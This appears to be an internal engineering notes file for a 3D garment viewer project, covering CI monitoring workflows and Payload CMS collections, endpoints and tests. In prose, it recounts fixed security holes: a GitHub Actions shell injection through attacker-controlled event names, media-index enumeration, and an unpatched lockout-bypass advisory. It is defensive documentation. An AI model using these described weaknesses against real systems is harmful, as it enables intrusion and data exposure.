Alert step by name and indentation; editing that block is how the alert path silently stopped being exercised. Verify via workflow_dispatch with a bogus target, not by reading.
- **perf-watch.yml**: weekly, deliberate (trend not liveness; a tight schedule would mostly measure GitHub runner variance). No install step (probe = fetch only; cannot break because of the lockfile). ⚠️ Never GETs the model (1.9–8.2 MB against a $5/month R2 egress cap) → therefore cannot report the model's cache status (cf-cache-status is trustworthy only from a GET's own headers: measured same URL same minute — GET said HIT age 49431, HEAD said DYNAMIC; a `curl -I` probe would conclude "model never cached", convincing and completely false). 403/429/503 inconclusive, run stays green (an alert firing on Cloudflare's mood gets muted; a muted alert is how the outage path stayed silent 17 days). DELIBERATELY NO `gh issue create` — a third untested copy of the issue-opening shell reproduces the exact shape of failure uptime+heartbeat already had; failed scheduled run notifies via GitHub workflow-failure notifications, proportionate for a weekly trend. If issues are ever needed here, add them to test-alert-shell.sh in the SAME commit.
- **heartbeat.yml**: WHO WATCHES THE MONITORS — 2026-08-05 uptime failed at checkout ~23 h with NO alert (not alerting broken — it never reached the deciding step; a job dying before setting its output produces silence indistinguishable from a healthy site). Fixed as a permissions bug; the CLASS of failure was not. Works by asking the Actions API when each watched workflow last SUCCEEDED rather than being told (nothing remembers to report in; deleted/disabled/renamed/quietly-skipped caught the same as failing). ⚠️ Cannot watch itself (accepted; shrinks the blind spot from "every scheduled job" to "one job doing one API call"; complete closure needs an off-platform monitor the budget doesn't run to — since closed via Sentry cron monitor, see below). Every 6 h (comment used "uptime every 15 min → 6h ≈24 missed runs"; measured median gap 45 min → nearer 8; worst observed 6.1 h is TWICE the 3 h uptime budget — premise "budget several times own interval" no longer holds for uptime, deliberately unchanged, see RUNBOOK). `contents: read` even though NOTHING is checked out — deliberate inoculation (permissions replaces defaults; adding checkout someday = the 404 "Repository not found" and the monitor joins the things that fail silently). WATCHED table `file:hours:mode:cadence`, cadence LAST so read() absorbs its colons (⚠️ old comment said a colon in cadence would "silently truncate" — MEASURED 2026-08-19 WRONG: read assigns unconsumed remainder incl delimiters to the LAST variable → `daily at 07:23 UTC` arrives whole; a colon in hours WOULD break — not being last). `mode`: success = "run AND pass" (backups, digests) vs completed = "ran at all" (uptime legitimately FAILS when the site is broken). ⚠️ WITHOUT the mode split, fixing uptime BREAKS heartbeat: until 2026-08-30 uptime always concluded success even while assertions failed → satisfied daily, loop never fired; now a genuine outage past budget would make heartbeat open a SECOND issue claiming the check is "no successful run on record" — false. A watchdog saying the wrong thing during a real incident is the most-repeated recorded failure here. uptime owns "is the site up"; heartbeat owns "is the watcher still watching". lighthouse-live watched for COMPLETION. Known limit: LH also runs after CI on main, SKIPPED when CI failed — skipped counts as completed → a stretch of red CI could hide a dead weekly schedule. The watched-file-still-EXISTS guard lives in heartbeatMonitor.test.ts (this job checks nothing out — cannot read .github/workflows; a rename would otherwise make the loop report "no successful run on record" forever = indistinguishable from genuinely dead). `--status success` alone not enough (an if:-skipped run concludes success → silently-not-doing-work looks healthy). Wording must match the question ("ran" vs "succeeded"). Alert: same open-issue-silences-alarm defect + fix as uptime; STALE via env not `${{ }}`; 12 h quiet (runs 6 h; slow-moving condition → at most every other run comments; each comment carries the CURRENT full list so a delayed one is never stale). `%b` not `%s`. `// empty` load-bearing. Base case CLOSED 2026-08-25: Sentry Developer plan already used for viewer includes one cron monitor at no extra cost. Runs only when every step above succeeded (a workflow dying before measuring sends NO check-in → Sentry alerts on the missing ping; nothing has to notice its own death). Optional: unset var skips (never a gate); check-in URL not secret (public ingest key). ⚠️ Monitor config lives in the check-in payload beside the cron: they must agree (heartbeatMonitor.test.ts fails if they disagree; Sentry upserts on every ping → dashboard hand-edit corrected within 6 h instead of drifting unseen). Schedule deliberately LOOSER than the cron (job every 6 h; Sentry told to expect 12 h → healthy pings ~twice per window, one dropped run can't alarm). MEASURED 2026-08-30 over 39 runs: the number that matters is the GAP between consecutive check-ins, not lateness (GitHub sometimes DROPS a run entirely — three dropped in sample); worst observed gap **818 min (13.6 h)** on a 6-hour cron, median 364. False-alarm unless (expected interval + margin) > worst gap: 12h+360=1080 vs 818 = 4.4 h headroom. Smaller fixes that DON'T work: 6h+120 = 480 → alarmed from 2026-08-26; 6h+355 (most a 6h schedule can carry) = 715 → STILL alarms. Old 120 min came from a then-correct 19–90 min measurement; delivery degraded sharply after that date → alarm wrong on most cycles, VIEWER-4 accumulated 17 occurrences while the workflow was healthy throughout — a watchdog crying wolf every cycle is worse than none. Re-measure THE GAP before tightening (`gh run list --workflow=heartbeat.yml --limit 40 --json createdAt,event`).
- **diagnostics-digest.yml**: Events table collected real failures since 2026-07-21 and nothing ever read it (2026-08-03 audit: 8× model-load-error, 13× variant-missing, one uncaught React error from genuine visitor sessions — every one a buyer who didn't see a garment, none known to anybody). The viewer reports why it broke (diagnostic.ts) — only pays off if somebody looks; this is the looking. Weekly (trends not outages). ⚠️ Shipped with the checkout permissions defect in f1a48eb and KEPT it when uptime was fixed (fix applied to the file that had visibly broken, not to the pattern); while failing at checkout this job — the ONLY thing reading Events — saw every event recorded correctly and read by nobody = the precise condition written to end its own header. `environment: production` step 1 of 2. NO cache (reads production D1). Version-bump note: landed while the workflow still had NO successful run on record (first slot not yet delivered — schedules throttled ~27%); if the first run fails, TWO candidates: the bump and a pre-existing never-executed-end-to-end fault (D1 read step + token's `wrangler d1 execute --remote` permission never exercised) — check pre-existing first. Pinned by diagnosticsDigest.test.ts running the exact SQL against SQLite. Query fixes from first public issue #5 (2026-09-11): 371/385 rows were ONE scripted audit of ours (browsers = distinct UA now; run-apparel- ones excluded — endpoint also drops at intake); 17/19 client_error = the ResizeObserver loop notice Sentry already ignores (excluded via coalesce() so an error with NO message still counts); created_at is ISO with T — datetime('now') prints a SPACE, T sorts after space → rows on a cutoff DATE passed whatever time (strftime keeps T). ⚠️ event/product/variant are ATTACKER-CONTROLLED (events.ts allowlists names only for 'analytics'; diagnostic/error are free-form by design and selects exactly those; anyone can POST /api/public/events → untrusted text into $GITHUB_OUTPUT heredoc then shell below): ALLOWLIST not escape list (outside set → '?' — kills newlines (could close the <<DIGEST heredoc early and forge step outputs), pipes (break the markdown table), every shell metacharacter in one rule). H1 write-volume step: the only thing measuring write VOLUME (verify-backup counts rows only while verifying; an analytics flood appears in NOTHING — first signal would be the Cloudflare bill; threshold 5,000/24h ≈35× the busiest real day and 4 orders below D1's 50M writes/month). COUNT not GraphQL Analytics deliberately (GraphQL can't diverge from the bill = stronger signal, but needs a new API token + new secret + new failure mode in a job already holding working D1 credentials — that's the upgrade path). Queue retention probe L7-01: setting lives ONLY in the Cloudflare control plane (14 days = 1209600 s both queues, documented max Workers Paid; repo-wide grep finds it nowhere — correct and completely unguarded: dashboard access could restore the 345600 default, nothing notices). Matters most for the DLQ (thrice-failed garment's only trace; ingest bucket lifecycle expires raw at 14 days too — two numbers deliberately equal). Runs HERE not in uptime (uptime holds no Cloudflare credentials; this already declares environment: production). `|| true` (probe exits 2 INCONCLUSIVE — no creds/auth error/empty list — unreadable must never report as drifted; exits 1 only on reading a contradiction). Growth counts EVERY row incl our own (measures write volume not visitors); ISO cutoffs (datetime() said "491 rows in 24h" when the true count was 1). Number() regardless (malformed response → 0, not a string the comparison mis-handles). Three plain substitutions NOT one eval (eval was written first and removed — evaluating a string this job built = the shape of the 2026-08-10 injection fix; "but this input is trusted" was the argument that was wrong that time too). Growth condition NOT optional (rows counts diagnostic+error only → an analytics flood leaves 0 → step never runs = precisely H1's gap). DIGEST_TABLE via env not `${{ }}` inside run: — until 2026-08-10 it was `"${{ steps.read.outputs.table }}"`, GitHub expands BEFORE bash sees it → a crafted event name closed the quote and ran arbitrary commands with the job's CLOUDFLARE_API_TOKEN + GH_TOKEN; never exploited (workflow had no run yet); two independent fixes between DB and shell — keep both. Label must exist before either command (gh issue list --label fails on an unknown label just as create does; uptime creates its label first, this file didn't → first successful run would have died instead of reporting). Rolling issue (a quiet month must not bury the tab). Legend in body explains event names to a reader at face value.

## 16. apps/cms/src/{collections,endpoints,fields,lib} (106 files: 100 .ts + 6 .tsx) — COMPLETE (ALL READ 2026-09-22; Products.ts, RawUploads.ts, publicViewer.ts covered in sections 1–3)

- `collections/DocumentVisits.ts` — One row per day/document/visitor/kind, written ONLY by the documents Worker (`infra/apex-404/visits.js`) via raw SQL, never through this collection's API: admins read and prune, the Worker writes (`create`/`update` locked false, `delete: isAdmin`, unique index on day+document+visitor+kind). Admin description explains the data honestly to the operator: Pakistan time, counts approximate, WhatsApp shows as Safari/Chrome, "Email scanners such as Outlook Safe Links can look like a person", auto-deleted after 12 months. Kinds include `private` ("asked not to be tracked"), `link-preview`, `robot`, `old-link`; every field `readOnly`.
- `collections/DocumentVisitEmails.ts` (33 lines, read whole) — One row per Mon–Sun week: the weekly-email guard and its outcome (Task 8). Hidden from the nav "because nobody edits it by hand"; admins read it so the summary box can show "Last weekly email"; create/update/delete all false.
- `collections/Media.ts` — Public picture + finished-3D-file library. ⚠️ `ALLOWED_MIME_TYPES` is built FROM the same two lists the pickers filter on: "They were separate literals until 2026-08-09 and nothing would have caught a drift." ⚠️ The literal `'.glb'` entry is an extension, not a MIME type — deliberate: Payload builds the input's `accept` by joining verbatim, macOS has no UTI for model/gltf-binary, so without it the picker greys out GLBs; `validateMimeType` uses `startsWith` so it "can never match a real MIME type — it is inert for validation and only fixes the picker." ⚠️ `folders: true` is a BETA accepted 2026-08-10 (Payload 3.86 doc says may change; 1,000 files flat = unusable; owner took the risk; property is top-level `folders`, verified against payload's own types and sanitize.js). ⚠️ READ ACCESS WAS `() => true` UNTIL 2026-09-05 "AND THE REASONING WAS WRONG TWICE": the files are public (served from R2) but what leaked was the INDEX — measured, unauthenticated `GET /api/media?limit=200` returned all 68 documents: 11 GLB URLs (51.2 MB), 55 posters, every filename/size/dimension, alt strings carrying preset labels, and two orphan models incl. the superseded 28.3 MB flagship; the bucket itself 404s on listing, "This endpoint made that protection pointless: a competitor no longer had to guess a filename, they could ask for the manifest." The 2026-08-30 fix put three reviewer fields behind auth but "treated the enumeration itself as harmless, and it is not."
- `collections/mediaRules.ts` — Media upload invariants extracted as a pure function "so the security- and reliability-critical rules are unit-testable without a database." ⚠️ Every rejection is an `APIError` with explicit 400: a plain `Error` from a Payload hook "is replaced by the generic handler with the useless 'Something went wrong.'" — "These messages are the whole point — they tell a non-technical operator exactly what to do next." `MODEL_MIME_TYPES`/`IMAGE_MIME_TYPES` exist so every picker's `filterOptions` and the upload allow-list "cannot drift apart"; Payload enforces filterOptions SERVER-SIDE too. History: until 2026-08-09 `glbAsset` was unfiltered "so a JPEG could be attached and published, because the publish gate only tests that *something* is attached", and the library held five byte-identical-alt GLBs, four superseded, one pre-artwork-fix. `application/octet-stream` is in the model list on purpose (browsers report hand-picked .glb that way; `checkMediaUpload` rejects octet-stream without a .glb name).
- `collections/rawUploadRetry.ts` (65 lines, read whole) — What a save of a raw upload means for the shrink queue, pure so both hook decisions are testable. Q-07: "Try this again" used to enqueue on any false→true flip → a tick during queued/processing started a SECOND run (two containers, two Media docs, later silently winning); box now hidden unless failed/ready AND "because a hidden field is a courtesy, not a guard", the hook refuses the same case itself; a row with no recorded status is allowed through ("refusing would leave a stuck row with no way out"). CI-01: ingest bucket expires at 14 days — a retry on an expired file used to queue a job that could only fail twice then dead-letter while the record said "Ready to review"; hook now HEADs the object and writes `EXPIRED_UPLOAD_REPORT` instead (a sentence naming the 14-day policy and pointing at the archive bucket for post-2026-09-03 runs).
- `collections/Users.ts` — Auth: `maxLoginAttempts: 5` / 10-minute lockout built into Payload ("no extra infrastructure"; Cloudflare rule documented as optional extra layer); `useAPIKey: true` so the shrink robot can authenticate (per-user, revocable keys, Editor role — humans stay email/password). ⚠️ THE UNPATCHED ADVISORY CLOSED BY CONFIGURATION — audit FA-O-71: GHSA-jg8r-5jh2-v2xj (`unlock` default allows ANY authenticated user to clear lockouts) affects payload ≤3.88.0 with **first_patched_version: NONE** — read off the advisory API 2026-09-07 "not inferred. There is no upgrade to take." It applied "ONLY BECAUSE THIS KEY WAS ABSENT": Payload's defaults assign `unlock: defaultAccess` = `Boolean(user)`; the `access` block named four ops and said nothing about unlock. Cost: the only brute-force protection could be undone by an Editor or the shrink robot — "A lockout anyone signed in can undo is not a lockout." `unlock: isAdmin` not `false` — "an admin locking themselves out is the case this operation exists for… With `false` the only route back would be a D1 write against production." Editors read only their own record; nav hidden for non-admins.
- `collections/publishGating.ts` — Publish-gating rules for Products, pure so invariants are unit-testable; colours now arrive inline so no DB read. Three invariants disappeared with the old shape "and are NOT missing by accident" (one default colourway now impossible to violate; product-default==marked-default has one place to state it; variantId-prefix rule replaced by something stronger: "the name must actually be present in the file the robot processed"). `artworkVerdict: 'damaged'` blocks, `'ok'`/absent do not — "Absent is the honest value for every file uploaded before this check existed"; any non-blank `artworkOverrideReason` publishes anyway. `GateColourway` separates RAW from display values (`hasDisplayName`/`hasSlug` vs the display fallback) "this is what tells `noName` below apart from a colour that genuinely has that name." `GATED_FIELDS` = the fields whose value decides publishability — "A write that leaves all of them untouched cannot make the product any more or less publishable, so re-running the gate on it achieves nothing"; ⚠️ `fileColours` is DELIBERATELY absent: gating it once blocked the shrink robot's own write on a published-but-model-less product, "which prevented recovery from exactly the state the gate was complaining about."
- `collections/rawUploadStatusLabels.ts` (43 lines, read whole) — ⚠️ MUST NOT carry `'use client'` — "that split is load-bearing, not tidiness." `LABELS` used to live in the client cell and Dashboard (a Server Component) imported it: next's flight loader rewrites EVERY named export of a 'use client' module into a throwing client reference; `registerClientReference` only defines `$$typeof/$$id/$$async`, so `LABELS['queued']` was a property read on an object without the key → `undefined`, never a throw, so `?? upload.status` quietly won — "Nothing catches this at build time: TypeScript has no notion of the RSC client/server rewrite… vitest doesn't run Next's webpack/turbopack loaders at all." Dashboard showed bare enums. "Keep this file free of `'use client'` and of anything that would require it."
- `collections/Events.ts` (61 lines, read whole) — First-party viewer telemetry sink; rows written ONLY by `/api/public/events` (Local API, overrideAccess) — create/update closed, admins read+prune. "Deliberately stores NO IP address and NO personal data — only a coarse, length-capped user-agent string and the named event plus product/variant context. This is the single consumer of the viewer's analytics seam." `versions: false` pinned "Especially unwanted here: this is the highest-volume table"; hidden from editor nav.
- `collections/rawRules.ts` — Validation for the private RAW inbox: deliberately RELAXES two Media rules (no 40 MB cap — "accepting the big raw file is the whole point"; no safe-filename requirement — CLO names have spaces/brackets) while KEEPING the safety rules that matter (GLB only, never `.zprj`, absolute sanity ceiling, no filename char Payload sanitises differently on the two sides). "The raw file is NEVER buyer-facing: it lands in a private ingest bucket with no public domain." ⚠️ `RAW_HARD_MAX_BYTES` RAISED 600 MB → 2 GB on 2026-08-21 and "the old value was NOT wrong when it was chosen" — sized against ~350–400 MB observed exports until the 1,313,979,936-byte Cycling-Bib arrived; "The premise changed, not the arithmetic": 99.97% topstitch, shrinks to ~20.6 MB. Sized against the CONTAINER with measurements (standard-4: 12 GiB RAM, measured peak RSS 5.27 GB in 32.5 s end-to-end; 20 GB disk; 5 MB multipart parts → ~410 parts vs R2's 10,000 limit) — "Do not raise this further without re-measuring peak RSS — an OOM inside the Container surfaces as a failed shrink job, not as a memory error." ⚠️ `DESYNCING_FILENAME_CHARS`: Payload's two sanitizers disagree (R2 key at multipart-init uses `sanitizeFilename` — control chars only; document filename later uses `sanitize-filename` — also strips `/?<>\\:*|"` and trailing dots) so `jacket?.glb` is stored one way, recorded the other, and the beforeChange HEAD "rejects a perfectly good upload with 'your file did not finish uploading' — a misleading message for a problem that is really just the name."

- `collections/DocumentVisitSalts.ts` (22 lines, read whole) — The daily secret `visitorCode` is built from. NO access for anyone through the API — all four ops `false`, "only the documents Worker's own SQL reads and writes it" — and hidden from the nav "because it holds nothing an owner would ever need to look at."
- `collections/Inquiries.ts` — Contact-form inquiries. Owner decision 2026-09-07 (D3, FA-I-06): **stored first, emailed second** — "A mail outage then costs a notification and never the inquiry. The audit's case against a form at all was that one which silently drops a buyer's message is worse than a mailto link that works — this ordering is the answer to it, not a footnote." ⚠️ `create` IS CLOSED TO EVERYONE, INCLUDING THE FORM: the public route handler writes with local API + `overrideAccess: true`, so "the ONLY path in is code that has already validated the input, checked the honeypot and passed the rate limiter" — opening `create` would put `POST /api/inquiries` on the internet with none of that. ⚠️ `read` is authenticated "WHICH MATTERS MORE HERE THAN ON ANY OTHER COLLECTION": named person, employer, address, commercial intentions — "the most sensitive data this system stores, by a distance… this starts closed rather than being narrowed later" (contrast Media, narrowed 2026-09-05). ⚠️ "NOTHING HERE IS EVER RENDERED ON A PUBLIC PAGE, and it must stay that way… A 'recent inquiries' feature would publish a customer's name and plans to the internet." Fields readOnly except `status` — "The one field on this screen you are meant to change"; ⚠️ `notified` checkbox "makes 'stored first' worth anything. Without it a failed email is invisible… `notified: false` with a reason beside it is what turns a silent loss into a visible one." `disableCopyToLocale` because "Payload's own `createdAt` is the received time; a second field would drift from it."
- `collections/mediaRules.test.ts` — Pins checkMediaUpload: normal GLB, URL-safe poster, spaces rejected ("the live media-outage vector"), other URL-unsafe chars, 40 MB hard ceiling, `.zprj` with source-file guidance, non-GLB octet-stream, soft 9 MB warning allowed, ceiling NOT applied to images. ⚠️ Every rejection asserted to be APIError(400) — "Payload's generic handler turns any error without a non-500 status into 'Something went wrong.' — useless to the operator, and exactly the trap that was closed in RawUploads.beforeChange but left open here until 2026-07-28."
- `collections/uploadHooks.test.ts` — Tests the upload gates' WIRING, "and the two hooks nobody had looked at." ⚠️ THE SHAPE OF THE GAP: rules modules at 94–100% coverage while `Media.ts` sat at 14.28% lines and **0% functions** ("not one function in that file had ever executed"), RawUploads 4.76%; two of four hooks "not even named in the audit… arguably the most consequential": `Media.beforeDelete` ("the hole that left a live product with an empty 3D stage") and `RawUploads.beforeChange` ("stops a document being created for bytes that never arrived, after a 382 MB export did exactly that"). Tests the GLUE: `if (data?.filename)` guard for robot writes, warn-vs-throw split, APIError rethrows. ⚠️ beforeValidate is SYNC while beforeChange/beforeDelete are async — "a sync hook THROWS where an async one REJECTS, so `.rejects.toThrow()` silently fails to assert anything against the sync pair." Typed helpers on purpose — a loose Record "compiles at runtime and then fails `tsc` on every `.mock.calls` read — and `apps/cms` typecheck is a separate CI gate, so a test file can be green and still break the build." First test asserts the hooks exist "so a Payload shape change cannot silently empty this file."
- `collections/rawUploadRetry.test.ts` (75 lines, read whole) — Q-07 matrix: create always enqueues; tick on finished row retries (both RETRYABLE_STATUSES iterated); tick while queued/processing refused; already-ticked box = ignore ("the robot un-ticks it itself"); robot's status patches and delete ignored; no-status row let through "rather than stuck". `retryBoxVisible` only for finished runs. `EXPIRED_UPLOAD_REPORT` asserted to "tell the owner what happened and what to do, in their words": matches /14 days/, /Nothing was queued/, /Upload the CLO export again/.
- `collections/rawRules.test.ts` — The inbox's relaxation verified BOTH ways: large messy-name raw accepted ("the whole point of the inbox"), octet-stream .glb accepted, but `.zprj`, non-GLB, non-GLB octet-stream, over-ceiling, and empty-mimeType non-GLB rejected; 40 MB Media cap NOT applied. ⚠️ Ceiling assertion DERIVED from the constant, not hardcoded: the old "600 MB" string broke when raised to 2 GB — "a real catch, but one that only ever restates the source. Deriving it keeps the test about the BEHAVIOUR." ⚠️ >50 MB regression: storage-r2 hands Payload an EMPTY buffer above 50 MB "so any mimeType-based check upstream of us sees nothing… Our gate must stand on the extension alone. See the long comment on RawUploads.upload — do not reintroduce `mimeTypes`." APIError(400) asserted — "the dead end that cost a full diagnostic round-trip on the guard's first live test."
- `collections/documentVisits.test.ts` — Proves each of the three visit collections actually WIRES `isAdmin`/hard-false to every operation (roles.test.ts already proves isAdmin itself) "and that the migration in this task builds the table the SQL in Task 5 and Task 8 expects" (via `migratedDatabase`). Salts: all four ops false for everyone "— nobody reads a salt through the API". Field names asserted IN ORDER against the contract.
- `collections/mediaReferences.test.ts` — Pins every field that can point at a Media document. WHY: two places decide "unused" (`isMediaReferenced` in shrink, `scripts/find-orphan-media.mjs`) and "one of them issues an irreversible DELETE against production media. A relationship added without updating both makes a LIVE asset look unreferenced." ⚠️ "THIS TEST WAS UNABLE TO CATCH THE CASE IT EXISTS FOR, until 2026-08-29": it compared BARE field names against a hand-written list while both consumers use DOTTED paths — adding a relationship at an already-known name (e.g. `heroShots[].posterPreview`) produced no new bare name, test stayed green, "A Media file referenced only from there would be reported as an orphan and deleted." It also kept a THIRD copy of the list, so the root CLAUDE.md describes it wrongly in both directions. Now: walks the real collection configs ("A regex cannot tell whether a field sits inside an array, which is exactly the distinction that made the old version blind"), compares against the list shrink's cms.ts actually EXPORTS, and cross-checks the script's copy (read as text because "The script calls main() at import").
- `collections/productsPublishHook.test.ts` — Tests the publish gate's WIRING, "which nothing tested until 2026-08-29." ⚠️ HOW THE GAP LOOKED: publishGating.ts had 63 tests at ~100%, "Not one reached the hook… Replacing the entire `beforeChange` hook with a no-op left 439 of 439 CMS tests passing." The coverage report said so all along (Products.ts 37.28% with every uncovered line inside this hook; Media.ts 0% FUNCTIONS) "and nobody read it." So it tests deliberately NOT the rules but the GLUE: `{...originalDoc, ...data}` merge, `variantsVerified` overwrite, Events write + swallowed catch, `changesAnything` early return, conditional artwork read, APIError rethrow — "Every one of those is a decision made in `Products.ts` and nowhere else." Guard test: hook must exist "If Payload's hook shape changes, or the hook is moved to a field, every test below would silently stop exercising production — which is the exact failure this file exists to close." `variantsVerified` DERIVED never trusted: "If this line is ever removed, a product could be published as verified while its colour buttons point at colours that are not in the file."
- `collections/Products.test.ts` — Field collector walks `fields` AND `tabs[].fields` because Products nests fields in tabs (flat `.find` can't reach productCode/slug/glbAsset…); ⚠️ deliberately does NOT descend into array/blocks `.fields`: colourways rows have their own `slug` "a different field in a different, row-scoped namespace — not a second definition of the product's `slug`. Recursing into it made this collector overwrite the product-level `slug` entry… Caught by this test failing with the colour row's hook shape instead of the product's." Fake reqs hand in the minimal shape each function touches ("this file has no Payload bootstrap"); asserts beforeDuplicate round-trips through the SAME `validate` a typed value would face, defaultValue against CatalogueDefaults global including the D1-throw case, and American spelling via `findBritishSpellings` from scripts/copy-rules.mjs.

- `collections/uploadConfig.test.ts` — Config-level guards for the 2026-07-27 upload defect: "These assert the *collection configuration*, not a pure function, because the bug lived entirely in config: setting `upload.mimeTypes` on a clientUploads collection silently breaks every upload over 50 MB. The unit tests for checkRawUpload/checkMediaUpload cannot catch that — only these can." (storage-r2 returns an empty body >50 MB, Payload sniffs 0 bytes, falls back to an extension map with no `glb`, guesses text/plain → rejects; empty allow-list makes validateMimeType short-circuit true.) ⚠️ The `clientUploads` assertion was inverted 2026-07-28: the flag "was believed to be load-bearing; it never was" — with mimeTypes unset, checkFileRestrictions tests the filename against an executable blocklist and "no restricted extension is a suffix of '…glb', so a GLB always passed regardless"; "Keeping the assertion inverted so it is not quietly re-added."
- `collections/mediaFieldAccess.test.ts` — Media access at collection AND field level. ⚠️ "THIS DOCBLOCK OPENED WITH '`Media.access.read` is `() => true` on purpose' UNTIL 2026-09-05" — it is `isAuthenticated` now; "the premise was wrong — the files are served from R2, not through this API". The field-level half still stands and "is the reason the collection-level hole survived an audit: framing the leak as 'a public collection is not the same as public fields' fixed the three fields and treated the enumeration itself as harmless." ⚠️ "'THE COLLECTION IS PUBLIC' WAS READ AS 'EVERY FIELD ON IT IS PUBLIC'": measured 2026-08-30, `GET /api/media?limit=2` unauthenticated returned artworkVerdict, artworkOverrideReason, sizeWarning on every doc — "the QA verdict on a garment's printed artwork, the free-text reason someone published a damaged one anyway, and an internal size flag". Guard is written as a LIST that must be covered rather than three assertions: "a fourth reviewer field added later is the actual risk."
- `collections/storageR2Patch.test.ts` — Regression guard for "the defect that meant the raw-upload inbox had NEVER worked" (fixed 2026-07-27 by a pnpm patch). The bug: storage-r2's browser multipart handler computed its endpoint once as a STRING then mutated params — mutations never reached the URL, every 5 MB chunk hit the init endpoint, "no part was ever uploaded… and NOTHING was written to R2 — while the document was still created, because Payload treats the resulting 404 as success. Confirmed in production: 66 requests, zero carrying multipartId." WHY AN INSTALLED-BYTES ASSERTION: the fix lives in a pnpm patch, applied at install and baked into a client chunk — "if it ever stops applying, nothing fails — uploads just silently go back to writing zero bytes, and we would not find out until someone tried to publish a garment." (ERR_PNPM_UNUSED_PATCH covers version-key mismatch only, not edit/removal/upstream change.) WHEN REMOVABLE: upstream fixed in 4.0.0-canary.17 (`const getEndpoint = () =>`); latest still 3.86.0.
- `collections/publishGating.test.ts` — "Rewritten when colours moved inline onto the Product. Four cases from the old suite are gone ON PURPOSE, not by oversight" — they asserted invariants the new shape makes unrepresentable (exactly-one-default-colourway, default==marked, variantId-prefix) — "The last one is replaced by a stronger check: the name must exist inside the processed file." Fixture `cw()` defaults `altTextNamesProduct: true` so "every pre-existing case keeps its meaning and only the tests that opt in exercise the mismatch" (M2: default = a CORRECT label).
- `collections/Users.test.ts` — "THE POINT OF THIS FILE IS THE OPERATION THAT IS EASY TO FORGET": create/read/update/delete "are the four anyone thinks to write, and Payload has a fifth on an auth collection: `unlock`" — absent, so default `Boolean(user)` = ANY authenticated principal = GHSA-jg8r-5jh2-v2xj, `first_patched_version: NONE` — "there is no upgrade, only this configuration." ⚠️ "THE PRINCIPAL THAT MAKES IT CONCRETE HERE IS NOT A PERSON": the shrink robot authenticates with an API key in a Cloudflare secret "held for the entirely unrelated purpose of writing a Media document" — capability to clear an admin's lockout sat behind that key. Tests call access functions directly ("an `Access` function is a pure predicate over `req.user`, so exercising it is exercising the rule") ⚠️ PLUS a final test asserting the operation exists on the config BY NAME: "`access.unlokc` would leave the default in place and every assertion below would still pass."
- `endpoints/pipelinePlan.ts` — GET /api/pipeline/plan/:productSlug: what the pipeline's `merge --from-cms` reads instead of `<file.glb>=<VARIANT-ID>` tokens. WHY: hand-typing variant IDs meant they "had to match the CMS character for character or the colour buttons silently died on the live page. The CMS is the only place that knows what the colours are, so the CMS is what tells the pipeline. Nothing is stored twice." PRIVATE (admin/editor or robot key only) — "It exposes internal ordering, so it must never sit behind the public viewer's cache headers"; `Cache-Control: no-store` on every response including 401/404.
- `endpoints/projectViewer.ts` — "Pure projection from CMS documents to the public ViewerApiSuccess shape. Extracted from the endpoint so the data-exposure contract (only whitelisted fields ever cross the boundary — never users, notes, drafts or source references) is unit-testable without a database." `richTextToHtml` injected "so this module carries no heavy Payload richtext dependency." `absolutize` makes relative R2 URLs absolute against origin; null result when no active colourway has a usable poster (endpoint turns null into 404).
- `endpoints/eventsRateLimit.ts` — Rate limiting for POST /api/public/events. THE HOLE: the endpoint is unauthenticated, writes with `overrideAccess`, and always answers 204 "because a `navigator.sendBeacon` must never see a 4xx. So a flood fills D1 in complete silence… The first symptom would be the database, and by then it is already full." WHY IN THE WORKER NOT THE EDGE: free plan allows exactly ONE WAF rate-limit rule, spent on the admin login; "the project's whole budget is $5/month." ⚠️ PLAINLY STATED LIMITS: counters in isolate memory = PER COLO, reset on recycle — stops one hammering script, NOT a distributed flood "That is a DDoS, which is Cloudflare's layer… Nothing here should be read as protection against it." Deliberately NOT Cloudflare's `ratelimit` binding: it needs `unsafe.bindings` and "a binding the account cannot provision fails the DEPLOY of a live CMS. This mechanism cannot fail a deploy at all."
- `endpoints/events.ts` — Telemetry intake: batched JSON sent as `text/plain` beacon ("keeps it a CORS simple request — no preflight"), parsed server-side, every field validated + length-capped (LIMITS map), obvious bots dropped, stored via Local API, "No IP and no personal data are ever persisted. Always answers 204." ⚠️ `BOT_UA` includes `run-apparel-`: "On 2026-09-10 one such audit wrote 489 rows in 19 minutes — 371 of the weekly digest's 385 — because its user-agent held no crawler word, only its own name. A check that needs to see its own rows here has to leave the tag off." `MAX_EVENT_BATCH` 20; analytics names checked against the shared `VIEWER_ANALYTICS_EVENTS` whitelist.
- `endpoints/viewerCache.ts` — Short in-process cache for "the hottest endpoint in the product, and by a long way the slowest thing on a QR scan." MEASURED 2026-09-06 with `curl -w`: viewer HTML 41–49 ms, model 37–42 ms, THIS ENDPOINT 1,178–1,291 ms with no cf-cache-status — 25× slower, not a cold start (five samples in a 113 ms band); isolated vs /api/health (265–338 ms), "~900 ms of it is the database read and the projection." Visitor experience: "the page HTML arrives in 45 ms, and then nothing happens for 1.2 s… The poster's address only arrives in this answer, so nothing can paint before it." ⚠️ "THE `Cache-Control` ON THAT RESPONSE DOES NOTHING": a Worker's own response doesn't pass through the edge — "the fix has to be inside the Worker." ⚠️ CACHES THE PROJECTED BODY, NOT THE `Response`: "This response's `Access-Control-Allow-Origin` VARIES by request Origin — Payload's `cors: allowedOrigins` is an allowlist, verified live… a cache keyed without it would serve one origin's CORS header to another."
- `endpoints/health.ts` (23 lines, read whole) — Cheap liveness probe: one small D1 round-trip (`count users`), 200 `{ok:true}` / 503 `{ok:false}`, `no-store`, no auth, no data exposed.

- `endpoints/publicViewer.test.ts` — The HANDLER half of the only public door: "The projection is tested" reads as "the endpoint is tested" and is not the same claim — route registrations, slug normalisation, 404 body/status/headers, cache lifetime, `expectColour` were all at 0%. ⚠️ THE ONE THAT WOULD ACTUALLY BITE: `expectColour` separates "a colour named and mangled (a broken QR → 404)" from "no colour named (→ default)" — collapsing them ("the obvious 'simplification'") makes a mistyped slug silently serve the default garment: "A buyer scanning a tag for Wine would be shown Navy and told nothing… unrecoverable after the fact." `X-Robots-Tag: noindex` on the 404 asserted not assumed: "these URLs are printed on garment tags and get scraped, and an indexed 'not available' page for a real product code is a lasting embarrassment."
